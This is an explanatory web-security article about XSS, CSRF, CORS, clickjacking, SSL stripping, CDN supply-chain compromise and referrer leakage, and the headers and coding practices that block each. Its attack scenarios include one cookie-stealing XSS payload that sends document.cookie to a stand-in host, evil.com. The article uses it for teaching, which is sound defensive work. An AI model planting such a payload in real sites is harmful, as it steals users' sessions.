Browser Security

How browser boundaries contain hostile pages, and how application controls reduce injection, request forgery, framing, and supply-chain risk.

Andreas Ögren
~22 min read
Last updated July 2026

Browsers isolate sites and restrict what pages may read, load, and embed. Applications can weaken those boundaries through unsafe rendering, permissive headers, or careless credential handling. This article follows the main browser attack paths and shows which application controls and response headers interrupt each one. The security principles article provides the broader threat model.

Cross-Site Scripting (XSS)

Cross-Site Scripting (XSS) is an injection attack where malicious JavaScript is injected into a web page trusted by other users. Once running in a victim's browser, that script has the same capabilities as any legitimate script on the page.

How it works

The defining property of XSS is where the code runs. The browser executes attacker-controlled script inside the vulnerable site's origin, giving it the privileges of legitimate page code.

The unsafe transition happens when untrusted data reaches an executable browser context. A server may place it into HTML without the right encoding, or client code may pass it to a dangerous DOM API.

There are three main forms, and they differ in where the unsafe step happens. Stored XSS is the most severe. The malicious payload is saved to the database (in a comment, a profile name, a message) and gets served to every user who views that page.

Reflected XSS passes through the server without being stored. A crafted request carries the payload, and the server places it into the returned HTML without context-appropriate encoding. Search pages that echo a query are a common example. The payload appears in that one response, so the attacker usually has to persuade a victim to open the crafted URL.

DOM-based XSS arises in client-side code. A script reads attacker-controlled data, perhaps from location.hash, and passes it to an unsafe DOM sink such as innerHTML. The original server response can be harmless because the dangerous interpretation happens later in the browser.

What an attacker can do once JavaScript is executing in the victim's browser:

  • Read cookies, unless HttpOnly prevents it
  • Steal tokens from localStorage
  • Make authenticated API requests as the user
  • Log every keystroke
  • Redirect to a phishing page
  • Silently modify page content

Defenses

The primary defense is context-appropriate output encoding. Untrusted text must remain data when inserted into HTML, attributes, URLs, CSS, or JavaScript; each context has different rules. Frontend frameworks normally encode text interpolation, but escape hatches such as React's dangerouslySetInnerHTML, Vue's v-html, and the DOM's innerHTML deliberately bypass that protection. If the application must accept HTML, sanitize it with a maintained library such as DOMPurify before rendering it.

HttpOnly cookies limit token theft but do not prevent XSS. JavaScript cannot read an HttpOnly cookie through document.cookie, so an injected script cannot copy that credential elsewhere. The script can still act through the victim's session while it runs on the page. Session cookies should normally be HttpOnly for this reason.

Content Security Policy (CSP) is a response header that restricts which resources and scripts a document may use. It is a second line of defense rather than a fix for the injection. A strict policy can block many injected scripts and restrict common exfiltration paths, although its protection depends on every directive and the page's script-loading behavior.

Host-allowlist policies such as script-src 'self' https://cdn.example.com are difficult to keep effective. An allowlisted origin may expose content that an attacker can execute, and a long list is hard to audit. A strict CSP instead trusts scripts through a fresh nonce or a content hash. 'strict-dynamic' can extend that trust to scripts loaded by an already trusted script.

# Fragile: an allowlisted host can often be turned against the policy
Content-Security-Policy: script-src 'self' https://cdn.example.com
 
# Preferred: trust rests on the nonce, not on a list of hosts
Content-Security-Policy: script-src 'nonce-r4nd0m9x' 'strict-dynamic'; object-src 'none'; base-uri 'none'

A nonce is an unpredictable value generated for one response and placed in both the CSP header and the legitimate <script> elements. An injected script cannot run without that value. The application must avoid copying the nonce onto attacker-controlled script markup. With 'strict-dynamic', trusted scripts can load further non-parser-inserted scripts, so code that constructs script URLs from untrusted input still needs careful review.

Trusted Types addresses DOM injection sinks. With require-trusted-types-for 'script', covered sinks such as innerHTML reject ordinary strings and accept only the corresponding trusted type. Policies that create those values become the places to audit and, where appropriate, sanitize. Trusted Types became available across the latest major browsers in 2026, but older browser versions may ignore the directive. It remains hardening on top of safe DOM APIs, encoding, and sanitization.

Content-Security-Policy: require-trusted-types-for 'script'

X-Content-Type-Options: nosniff tells the browser to respect the declared media type instead of guessing another one for scripts and styles. It prevents a response served with the wrong type from being interpreted as executable content. Set correct Content-Type headers as well; nosniff makes those declarations enforceable rather than repairing them.

X-Content-Type-Options: nosniff
CSP in report-only mode

Deploying a CSP can block legitimate functionality. Content-Security-Policy-Report-Only reports violations without enforcing the policy, which makes it useful during rollout. Current deployments can use report-to with a Reporting API endpoint and keep report-uri as a compatibility fallback while support remains mixed.

Cross-Site Request Forgery (CSRF)

CSRF exploits the browser's automatic cookie behavior to make authenticated requests on a victim's behalf, without the victim knowing.

How it works

CSRF attacks target sites whose cookie policy allows a session cookie on an attacker-induced request. An evil site causes the browser to send that request to the vulnerable site. If the server treats the valid session as sufficient authorization, it may process the action without checking a separate CSRF signal.

CSRF and Same-Origin Policy

CSRF matters when a request changes server state, regardless of which HTTP method the application assigned to it. Well-designed APIs reserve safe methods such as GET for reads. The same-origin policy usually prevents the attacker from reading the response, but it does not stop the forged action.

Defenses

The SameSite cookie attribute, covered in depth in the HTTP article, limits when a browser sends cookies across sites. SameSite=Strict withholds the cookie from all cross-site requests. SameSite=Lax permits it on top-level navigations that use safe methods, such as following an ordinary link, but not on the hidden cross-site POST in the example above. Modern browsers generally treat an omitted attribute as Lax, with compatibility rules for recently created cookies. Set the attribute explicitly so the application's policy does not depend on browser defaults.

CSRF tokens defend against the same attack as SameSite, but they work at a different layer. That's why sites commonly use both instead of relying on either alone. SameSite is a single point of protection, and it can fail in several ways:

  • Never set, in a browser that doesn't apply Lax by default.
  • Misconfigured or disabled outright.
  • Unsupported by an older client.
  • Set to SameSite=None for a legitimate cross-origin integration.
  • Not applied because the request came from a same-site subdomain the application doesn't fully trust.

In any of those cases a forged request can still arrive with the session cookie attached, and nothing about the cookie itself stops it.

CSRF tokens are the independent backstop for that case. The server binds an unpredictable value to the user's session or request and rejects a state-changing request without a valid match. A forged request may still carry the session cookie, but the attacker cannot read the protected page to obtain its token. The token check therefore rejects the request.

Attack
How CSRF works

The attacker's page triggers a cross-origin request, and the browser automatically sends the victim's cookies along with it. The server sees a valid session and processes the request.

Defense
What stops it

SameSite=Strict or Lax cookies normally stay off a cross-site POST like this one. A validated CSRF token proves the request carries a secret value the attacking origin could not read.

Same-Origin Policy and CORS

The same-origin policy is the browser's default-deny rule for reading across origins. CORS is how a server opts specific origins back in.

What it protects against

Under the same-origin policy, JavaScript running on one origin cannot read the response to a request it made to a different origin. An origin is the combination of scheme, host, and port, so https://app.example.com and https://api.example.com count as different origins even though they share a domain. Without this rule, any page the user visits could quietly call a bank's API or a webmail API through the user's existing session. It could then read back whatever came out, provided the session cookie is sent cross-site at all. The inbox-reading scenario below walks through exactly that.

Why it only blocks reads, not sends

A page on evilsite.com can still cause some requests to mail.com. Links, images, and HTML forms have always crossed origins, and the web depends on that behavior. The same-origin policy mainly prevents the attacker's script from reading a protected response. If the request changes state and the attacker does not need the response, the problem is CSRF instead. SameSite cookies and CSRF tokens address that path; CORS does not.

CORS: opting specific origins back in

CORS is the mechanism a server uses to tell the browser a particular origin is allowed to read its responses. The header-by-header mechanics, such as the preflight exchange, Access-Control-Allow-Origin, and credentialed requests, are covered in the HTTP article. What matters here is why preflight exists at all.

A request with a custom header, a JSON body, or a method like PUT or DELETE is something a plain HTML form could never produce. Before fetch and XHR existed, no server had a reason to check where a request like that came from, because a cross-origin script had no way to send one. Most servers still don't check the Origin header on every request. A well-written one could reject an unexpected origin itself, but CORS can't assume every server does. So the browser first sends a side-effect-free OPTIONS request, and only sends the real one if the server explicitly answers with the right Access-Control-* headers. A server that's never heard of CORS won't answer correctly, and the real request never goes out. That protects servers that were never written with cross-origin JavaScript in mind, without requiring them to add anything.

A common misconfiguration

Some APIs reflect back whatever Origin header a request sends as Access-Control-Allow-Origin, instead of checking it against an allowlist. Combined with Access-Control-Allow-Credentials: true, this hands read access to authenticated responses to any origin that asks, which defeats the point of the policy entirely.

XSS vs. CSRF vs. CORS

Three different boundaries, not three names for the same thing

XSS, CSRF, and CORS have similar names but are different things:

  • XSS is an injection attack that lets attacker-controlled code run in a trusted origin. Safe DOM APIs, context-appropriate encoding, sanitization, and a strict CSP prevent or contain it. HttpOnly limits cookie theft but does not prevent XSS.
  • CSRF is an attack that exploits the browser's automatic cookie attachment to forge a state-changing request. Defenses are SameSite cookies and CSRF tokens.
  • CORS is not an attack. It's a protocol that allows a server to selectively relax the same-origin policy for trusted origins.

The mix-up usually comes from CSRF and CORS both involving a second origin. A request that qualifies as a CORS simple request can be sent before the browser checks whether script may read its response. Other requests require a successful preflight first. CORS therefore cannot be treated as a general CSRF defense. A CSRF defense, in turn, does not control which responses a permitted cross-origin script may read. XSS does not cross this boundary at all. The attacker's code runs with the affected page's own origin.

Clickjacking

The attacker makes the victim click something they didn't intend to, by overlaying a transparent version of the target site on top of their own page.

How it works

An attacker embeds the target site in a transparent <iframe> and positions it over a button on the attacker's page. The user sees the visible page but clicks a sensitive control in the authenticated frame underneath it.

Defenses

The defense is preventing pages from being embedded in iframes outside the site's control. Two mechanisms do this.

X-Frame-Options is the older header. DENY prevents embedding anywhere, while SAMEORIGIN allows it only in iframes on the same origin.

X-Frame-Options: DENY

The CSP frame-ancestors directive is more flexible and supersedes X-Frame-Options in modern browsers. It accepts a list of permitted embedding origins.

# No embedding allowed anywhere
Content-Security-Policy: frame-ancestors 'none'
 
# Only allow embedding within the same origin
Content-Security-Policy: frame-ancestors 'self'
 
# Allow a specific trusted partner site
Content-Security-Policy: frame-ancestors 'self' https://partner.example.com

For maximum compatibility, set both X-Frame-Options: DENY (for older browsers) and frame-ancestors 'none' in CSP for modern ones.

Protocol Downgrade Attacks

HTTPS prevents eavesdropping, but only if the browser uses it. On the first visit, an attacker on the same network can intercept the initial HTTP request before HTTPS kicks in.

How it works

An explicit http:// URL can still create a plaintext first request. It may come from an old bookmark, a printed URL, a QR code, or a link that hardcodes the scheme. If the browser has no prior HSTS policy for the host, an attacker on the network can intercept that request before the server redirects to HTTPS.

SSL stripping is the classic form this attack takes. The attacker sits between the user and the server and intercepts that initial HTTP request. Instead of forwarding it, they talk to the real server over HTTPS themselves, while relaying a plain HTTP response back to the victim. The user believes they're talking to the real site, but they're talking to the attacker. Since the victim's own connection is HTTP, everything they send or receive is visible and modifiable. Even if the server's first response to the HTTP request is a redirect to HTTPS, that redirect still has to cross the attacker's connection first. The attacker can intercept it there too, keeping the victim on HTTP.

Defense: HSTS

HTTP Strict Transport Security (HSTS) instructs the browser to always use HTTPS for a domain (even if the user types HTTP) for a specified period. Once the browser has seen the HSTS header, it converts any HTTP request for that domain to HTTPS before sending it, bypassing any attacker in the middle.

Strict-Transport-Security: max-age=31536000; includeSubDomains

max-age is measured in seconds, so 31536000 means one year. includeSubDomains extends the rule to subdomains. The non-standard preload directive is a prerequisite for common preload services, but adding it does not submit the domain. Preloading also requires a separate registration process.

The first-visit problem and preloading

HSTS solves the problem for returning visitors, but not the first visit. The browser hasn't yet received the HSTS header. The HSTS preload list is a list of domains that major browsers ship with, instructing them to always use HTTPS before the first request. Submitting to the preload list at hstspreload.org is free, but it is a significant commitment. Removing a domain takes months and requires coordination with browser vendors. Only submit if every subdomain of the domain is certain to serve HTTPS indefinitely.

Supply Chain Attacks

Loading a third-party script means trusting that it will always contain what's expected. If the CDN or the script provider is compromised, users run malicious code.

How it works

Including a script from a CDN with a plain <script src="..."> tag means the site executes whatever that URL serves. If the host or publisher account is compromised, substituted code runs with the page's origin privileges. The 2024 Polyfill.io incident showed this failure mode across sites that loaded a shared third-party URL.

This is the browser-facing edge of a larger problem. Build tooling, package registries, and CI/CD pipelines can be tampered with the same way, and a compromise there reaches an application before a single script tag is ever written. The software supply chain section of the web application security article covers that broader threat and the defenses (software bills of materials, dependency scanning, signed artifacts) that apply upstream of the browser.

Defense: Subresource Integrity

Subresource Integrity (SRI) lets a page specify the expected hash of a resource in the tag itself. The browser refuses to execute a mismatched response. Cross-origin SRI loads also require CORS approval from the resource host, which is why the example includes crossorigin="anonymous".

HTML 
<script
  src="https://cdn.example.com/library.min.js"
  integrity="sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxy9rx7HNQlGYl1kPzQho1wx4JwY8wC"
  crossorigin="anonymous"
></script>

The hash represents the exact file content expected by the page. A provider that changes a script at the same URL will cause the integrity check to fail, whether the change was legitimate or malicious. SRI therefore fits versioned assets whose updates can be reviewed and accompanied by a new hash. Self-hosting a pinned copy is another way to control when the code changes.

The npm supply chain

A CDN script tag is only one entry point. Package managers also install direct and transitive dependencies on developer machines and CI runners. SRI cannot inspect code that has already been bundled into the application's own assets. A malicious package can therefore run during installation, during the build, or later in the shipped bundle. The ua-parser-js compromise in 2021 used malicious package releases to distribute a cryptominer and credential-stealing code.

Defense: lockfiles and auditing

A committed lockfile and a frozen install mode such as npm ci make dependency resolution reproducible. They do not prove that the locked code was reviewed or safe. Pair them with update review, provenance controls, and vulnerability scanning. npm audit checks the resolved dependency tree against advisories, so it can identify known issues but not a new or undisclosed compromise.

Information Leakage

Browsers share information with third parties as a side effect of normal navigation. Two headers give servers control over what gets shared.

Referrer-Policy

Navigation and subresource requests can carry a Referer header describing the page that initiated them. The document's referrer policy decides how much of the URL is sent. A permissive policy can expose paths and query parameters to another origin, so secrets should not be placed in URLs and sensitive pages should choose an explicit policy.

# Send only the origin (not the full URL) for cross-origin requests
Referrer-Policy: strict-origin-when-cross-origin

strict-origin-when-cross-origin is the current default. It sends the full URL on same-origin requests, only the origin on equally secure cross-origin requests, and no referrer on a downgrade from HTTPS to HTTP. A sensitive page can use no-referrer or same-origin when even the origin should not be disclosed externally.

Permissions-Policy

Permissions Policy controls which origins may use selected browser features, including the camera, microphone, and geolocation. It is especially useful for restricting embedded frames. A top-level page can disable a feature it never needs or delegate that feature only to a named frame.

# Disable camera and microphone for this page and all iframes
Permissions-Policy: camera=(), microphone=()

An empty allowlist, (), disables the feature for the document and its descendants. (self) permits the top-level origin and same-origin descendants, but excludes cross-origin frames unless the policy delegates access to them. The policy does not isolate a compromised script that already runs with the top-level page's origin.

Attack Scenarios: What Stops What

Every section above explains a mechanism on its own. Attacks are easier to reason about as stories that name what the attacker is after and the one control that stops them.

The seven scenarios below cover every attack in this article, plus a variant of CSRF that steals data through a cross-origin read rather than forging a write.

1. Stealing session tokens through an injected comment

Scenario
Malicious comment persists

A user opens a discussion thread on a forum while logged into their account. An attacker has planted a comment containing <script>fetch('evil.com/steal?c='+document.cookie)</script>, aiming to steal visitors' session cookies. The browser renders the comment as markup instead of text, so the script runs in the user's session and sends their cookie to the attacker.

What stops it
Output encoding, HttpOnly

Output encoding is the primary defense. The comment is escaped before it lands in the page, so the browser renders it as text, not markup, and nothing executes. HttpOnly is the backstop. Even if a script does run, document.cookie can't see the session cookie at all.

2. Forging a bank transfer

Scenario
Hidden auto-submit form

A user is logged into their bank at bank.com and visits evilsite.com. The attacker wants to drain the user's account, so a hidden form on the page auto-submits a POST to bank.com/transfer with the attacker's own account as the recipient.

What stops it
SameSite cookies

SameSite=Lax or Strict on the session cookie means the browser won't attach it to a cross-site POST, so bank.com sees a request with no valid session and rejects it. CSRF tokens do the same job when SameSite can't be relied on.

3. Reading someone else's inbox

Scenario
Cross-origin fetch

A user is logged into mail.com and visits evilsite.com. The attacker wants to read the user's private messages, so JavaScript on the page runs fetch('mail.com/api/inbox') and tries to read whatever comes back.

What stops it
SameSite cookies, then CORS

Two independent layers apply, and either one can stop the theft. A Lax or Strict cookie is not attached to this cross-site subresource request, so mail.com sees no valid session. If the API deliberately uses SameSite=None, the same-origin policy still blocks evilsite.com's script from reading the response unless the CORS policy names that origin. Both layers would have to allow the request for the read to succeed.

4. Hijacking a click

Scenario
Transparent iframe overlay

A user who is logged into bank.com visits evilsite.com to claim an advertised prize. A transparent bank.com frame places its "Delete Account" control over the visible prize button. The user's click reaches the framed control.

What stops it
frame-ancestors

frame-ancestors (or the older X-Frame-Options) tells the browser bank.com may not be framed by evilsite.com at all. The iframe never loads, so there's nothing to overlay.

5. Stripping HTTPS on public WiFi

Scenario
SSL stripping

A user connects to bank.com over café WiFi. The attacker wants to read and alter the user's traffic, including their login credentials. To do that, they intercept the first plain-HTTP request, talk to the real bank.com over HTTPS themselves, and relay an unencrypted version back to the victim.

What stops it
HSTS

Once the browser has seen bank.com's Strict-Transport-Security header, or finds the domain on the preload list, it rewrites every request to HTTPS before anything leaves the machine. There's no plaintext request left for the attacker to intercept.

6. A compromised CDN script

Scenario
Breached dependency

A user checks out on an online store that loads its charting library from a shared CDN. The attacker wants the payment details entered on that checkout page. Once the CDN is breached, the injected code runs with full page access on every site that includes the script, this one included.

What stops it
Subresource Integrity

The browser hashes the file before executing it and compares that hash to the one pinned in the integrity attribute when the tag was added. A modified file doesn't match, and the browser refuses to run it.

7. Leaking a secret URL through a permissive referrer policy

Scenario
Referer leakage

A one-time recovery page at bank.com/reset?token=abc123 loads an image from an ad network. The site has set Referrer-Policy: unsafe-url for analytics, so the image request sends the full page URL to that network. The current browser default would have sent only https://bank.com/, but the site's policy weakened it.

What stops it
Referrer-Policy

strict-origin-when-cross-origin removes the path and query from cross-origin referrers. no-referrer sends nothing. The application should also exchange one-time URL secrets promptly and avoid loading third-party active content on recovery pages.

Security Header Summary

Each header protects a different browser boundary, and its value must match the way the site loads and embeds content.

Testing security headers

securityheaders.com can identify missing headers on a public URL. Treat its grade as a starting point. The correct policy still depends on the site's content, embedding rules, and browser features.

Choose controls from the paths untrusted data can take through the application. Start with safe DOM and template APIs, server-side request validation, and narrow framing and cross-origin rules. Add headers as enforcement boundaries, then deploy restrictive policies in report-only or staged form where a sudden change could break legitimate traffic.
